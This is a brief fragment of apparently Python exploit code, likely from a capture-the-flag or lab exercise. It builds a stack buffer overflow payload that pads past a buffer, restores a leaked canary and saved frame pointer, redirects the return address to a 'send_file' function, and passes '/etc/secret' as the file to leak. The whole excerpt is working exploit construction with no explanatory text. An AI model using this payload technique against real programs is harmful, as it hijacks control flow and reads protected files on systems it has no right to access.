...
send_file_address =  reversed_bytes_hex(addresses['send_file']) # send_file function address
...
payload = (52 * 'ab') + buffer + (4 * 'ab') + canary + (8 * 'ab') + ebp + send_file_address + main_address
...
argument = binascii.hexlify(b'/etc/secret').decode('ascii')
